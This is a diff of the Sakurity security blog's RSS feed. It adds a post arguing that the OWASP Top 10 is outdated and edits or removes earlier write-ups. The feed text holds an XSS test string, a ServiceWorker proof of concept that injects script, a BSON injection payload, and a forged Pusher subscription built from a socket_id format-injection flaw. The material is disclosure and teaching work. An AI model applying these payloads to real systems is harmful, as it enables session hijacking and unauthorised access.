@@ -6,9 +6,78 @@
 </description>
     <link>https://sakurity.com/blog/</link>
     <atom:link href="https://sakurity.com/blog/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 04 Nov 2017 11:46:11 +0300</pubDate>
-    <lastBuildDate>Sat, 04 Nov 2017 11:46:11 +0300</lastBuildDate>
-    <generator>Jekyll v3.4.3</generator>
+    <pubDate>Fri, 05 Jul 2019 12:05:02 +0300</pubDate>
+    <lastBuildDate>Fri, 05 Jul 2019 12:05:02 +0300</lastBuildDate>
+    <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>Why OWASP Top 10 is no longer relevant</title>
+        <description>At this point, OWASP Top 10 is considered one and the only bridge between security researchers and developers. There are some books and blog posts here and there but if you're looking for &quot;top threats &amp; vulnerabilities&quot; that's what you will be offered by others including Google.
+
+Unfortunately OWASP is out of touch with reality. First Top10 was released in 2003 and back then the web was a mess. CSRF? Everywhere. XSS? Give me a minute. SQL injection? Just try another parameter.
+
+Now most misdesigned vectors are treated on framework level (and you should always use one - don't build a house from scratch, reuse blocks that have proven track record). I will use Rails as an example but others are very similar.
+
+&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2017-Top_10&quot;&gt;Let's take up-to-date list from here&lt;/a&gt; and comment every item.
+
+&lt;img src=&quot;imgs/owasp.png&quot;&gt;
+
+A1. Injection - not going to happen with major frameworks. There are some corner cases such as &lt;a href=&quot;https://rails-sqli.org/&quot;&gt;barely used ORM methods&lt;/a&gt; which could be fixed by renaming &quot;calculate&quot; to &quot;unsafe_calculate&quot;. In fact every library developer should expose dangerous method with &quot;unsafe_&quot; prefix if you care about your users.
+
+Injection is still a relevant threat but only because ORM developers made naming mistakes. 
+
+A2 Broken Authentication and Session Management - session management is long time solved problem since we all use auth libraries. 
+
+Seriously do not roll out your own auth library, use Devise or Omniauth. They pop first during the audits.
+
+A3. XSS - (should be under A1 Injection) is generally solved problem. The output uses templates, client side frameworks use templates, corner cases like JSON-in-script-tag is also solved. Try to put &amp;#39;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(0)&amp;gt; in every input you see on a website (some people do it for a living) - yields nothing these days.
+
+There are still ways you can be hit by 3rd party libraries but there's nothing you can do as a developer. Just don't `html_safe` on unsafe strings. Obvious.
+
+A4 - Broken Access Control. Unfortunatelly business logic and access management isn't a solved problem. The best approach is to always chain your code as current_user.comments.find(params[:comment_id]) and manually assign things like topic_id (instead of mass assign) so the access is checked on all read/write operations. CanCan is also a great solution.
+
+A5 - Security Misconfiguration. This is good one and there's nothing a framework can do for you. There are things like Redis that is exposed by default. There's not much you can do about your coding style, just read manuals carefully and listen others.  
+
+A6 - Sensitive Data Exposure. You must be using https by now. Just use LetsEncrypt. Not worth a dedicated item.
+
+A7 - Insufficient Attack Protection. &lt;a href=&quot;http://www.skeletonscribe.net/2017/04/abusing-owasp.html&quot;&gt;That's the last straw that made me write this post.&lt;/a&gt; So now companies like Contrast Security can use OWASP to literally add &quot;A7. Not enough of Contrast Security&quot;. 
+
+A8 - CSRF. Solved problem. State-changing action must be non-GET and non-GET should require authenticity_token - simple as that.
+
+A9 - Using Components with Known Vulnerabilities - patch your stuff when CVE is out. Far from a solved problem but regular &quot;bundle update&quot; is all you can do.
+
+A10 - Underprotected APIs. Frankly, this one is written for complete noobs. If you don't realize that the attacker can fake arbitrary requests looking like from JS or mobile app, you're not ready to write production code.
+
+We are left with A1, A4, A5 and A9 as somewhat relevant and a dozen of other attack vectors common app faces with no single mention. 
+
+Not just most of the items being irrelevant for modern development team - what's worse it misses **so many attack vectors**. 
+
+From top of my head:
+
+1. Race conditions
+
+Look at &lt;a href=&quot;https://magoo.github.io/Blockchain-Graveyard/&quot;&gt;BlockChain Graveyard&lt;/a&gt; (ironically the Graveyard is great OWASP replacement with sorting by damage). Only few mentions race condition (many reasons are undisclosed) but reality is harsh.
+
+2. SSRF
+
+Webhooks, download this URL, instant payment notifications etc
+
+3. OAuth
+
+&lt;a href=&quot;https://sakurity.com/oauth&quot;&gt;There is a list of known OAuth design flaws&lt;/a&gt; and that doesn't fit into a single item of Top10.
+
+If you aren't maintaining some PHP app written 10 years ago, Top 10 list is irrelevant to you. By reading Top 10 you gain no useful knowledge. It's now just a marketing term and rather good indicator the company using it is a snake-oil. No, it's not even a &quot;good start&quot;.
+
+Many years ago when websites had more vulnerabilities than features it was a nice short list to get basic sense of what secure coding is.
+
+It's also true there's no alternative. There's no one big bible about all known platform-specific bugs. Creating one would be a very hard task and honestly not in best interest of us, security researchers.
+</description>
+        <pubDate>Mon, 24 Apr 2017 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2017/04/24/owasp.mdown</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2017/04/24/owasp.mdown</guid>
+        
+        
+      </item>
     
       <item>
         <title>Why OWASP Top 10 is no longer relevant</title>
@@ -103,7 +172,7 @@
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spawnNewMessageEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;n&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                 &lt;span class=&quot;n&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;registration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                 &lt;span class=&quot;n&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -174,7 +243,7 @@ setTimeout(function(){
 
 &lt;p&gt;I strongly believe there should be a way to switch off ServiceWorkers with a flag, because for me, it brings nothing to the table (did you read the Cache docs? it’s like rocket science), and I’m not so sure it won’t break Same Origin Policy or whatever in the future, since features are rushed to production with little review…  Here are some more low-sev vulnerabilities: &lt;a href=&quot;https://tools.cisco.com/security/center/viewAlert.x?alertId=43522&quot;&gt;FF&lt;/a&gt;, &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=422966&quot;&gt;JSONP+XSS=takeover&lt;/a&gt;, &lt;a href=&quot;https://alf.nu/ServiceWorker&quot;&gt;easier to take over sandbox domains&lt;/a&gt;.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 10 Dec 2016 00:00:00 +0300</pubDate>
+        <pubDate>Sat, 10 Dec 2016 00:00:00 +0200</pubDate>
         <link>https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html</link>
         <guid isPermaLink="true">https://sakurity.com/blog/2016/12/10/serviceworker_botnet.html</guid>
         
@@ -323,7 +392,7 @@ load(u);
 &lt;p&gt;This one works only in Chrome on desktop and only over https: websites, but is actually much more dangerous. It creates a worker which alters responses for all requests and there’s no need to explicitly cache every page - you can cover entire domain with one worker.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;onfetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;headers: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:'text/html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}))&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;headers: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:'text/html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}))&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;To install a ServiceWorker the browser wants to see it as a response with &lt;code class=&quot;highlighter-rouge&quot;&gt;content-type:text/javascript&lt;/code&gt;. Pinky, are you pondering what I’m pondering?&lt;/p&gt;
@@ -606,7 +675,7 @@ load(u);
 &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$query&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;token&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$gt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_bson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_bson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;id_ish&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
@@ -690,162 +759,6 @@ mng_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a_id&lt;s
         <pubDate>Thu, 21 May 2015 00:00:00 +0300</pubDate>
         <link>https://sakurity.com/blog/2015/05/21/starbucks.html</link>
         <guid isPermaLink="true">https://sakurity.com/blog/2015/05/21/starbucks.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Hacking Pusher with simple crypto vulnerability</title>
-        <description>&lt;p&gt;Specially crafted “socket_id” parameter could get us a valid auth for any private Pusher channel of your application and even forge any requests to Pusher API on behalf of your application if it has authentication endpoint for private channels (usally /pusher/auth).&lt;/p&gt;
-
-&lt;h2 id=&quot;briefly-about-pusher&quot;&gt;Briefly about Pusher&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pusherlogo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Pusher is powering realtime communications and delivers over 40B messages each month. Publisher sends messages to different channels: “public-announcement”, “private-123-messages” etc. Users (mobile apps, web frontends etc) can subscribe to those channels.&lt;/p&gt;
-
-&lt;p&gt;Some channels are public, but most of the time clients need private channels to securely notify their users with messages like “John just sent you $10”.&lt;/p&gt;
-
-&lt;p&gt;Pusher gives you 3 config values: app_id = ‘99759’, key = ‘840543d97de9803651b1’ (public key of your access token), secret = ‘8897fad3dbbb3ac533a9’ (secret key to sign API requests and authenticate private channels)&lt;/p&gt;
-
-&lt;p&gt;Every time the user connects to Pusher’s websocket it responds with current socket_id (looks like 45031.26030316). If this user wants to subscribe to private channels (say, private-123 for user_id=123) they need to get signed “auth” object from the server side and pass it to Pusher. Normally it’s a POST request to /pusher/auth?socket_id=45031.26030316&amp;amp;channel=private-123&lt;/p&gt;
-
-&lt;p&gt;The server side code is supposed to use SDK. Example for Rails (&lt;a href=&quot;https://github.com/search?q=Pusher+authenticate&amp;amp;ref=searchresults&amp;amp;type=Code&amp;amp;utf8=%E2%9C%93&quot;&gt;they all look the same&lt;/a&gt;):&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Pusher[&quot;private-#{current_user.id}&quot;].authenticate(params[:socket_id])&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;returns&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;. Sending this token back to Pusher websocket will subscribe you to &lt;code class=&quot;highlighter-rouge&quot;&gt;private-123&lt;/code&gt; channel.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pushersub.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;format-injection-in-authenticateparamssocket_id&quot;&gt;Format injection in authenticate(params[:socket_id])&lt;/h2&gt;
-
-&lt;p&gt;Let’s take a closer look at signing process in SDKs and see classic Format Injection vulnerability:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MultiJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;string_to_sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;
-    &lt;span class=&quot;nf&quot;&gt;compact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;authentication_token&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Digest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SHA256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HMAC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_to_sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:channel_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;It calculates HMAC of &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;socket_id&amp;gt;:&amp;lt;channel_name&amp;gt;(:&amp;lt;channel_data&amp;gt;)&lt;/code&gt; using API secret, and channel_data is optional 3rd parameter. In our case string to sign is &lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-123&lt;/code&gt;. Name of the channel is strictly validated, but &lt;strong&gt;socket_id coming directly from user input is inserted as is&lt;/strong&gt;. Therefore sending socket_id=&lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1&lt;/code&gt; gets us a signature of &lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1:private-123&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;With this signature we can subscribe to private-1 or any other channel, sending the last part &lt;code class=&quot;highlighter-rouge&quot;&gt;private-123&lt;/code&gt; of string-to-sign in channel_data parameter (which comes in really handy because Pusher doesn’t verify if it’s valid JSON).&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;event&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;pusher:subscribe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;auth&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;channel&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;private-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;channel_data&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;private-123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Pusher verifies the token for private-1 by computing HMAC of socket_id=45031.26030316 + channel_name=private-1 + channel_data=private-123 and it is equal one we have for socket_id=&lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1&lt;/code&gt; + channel_name=private-123&lt;/p&gt;
-
-&lt;p&gt;This is how we can subscribe to arbitrary private channel of vulnerable Pusher client. But it’s only the beginning of the story.&lt;/p&gt;
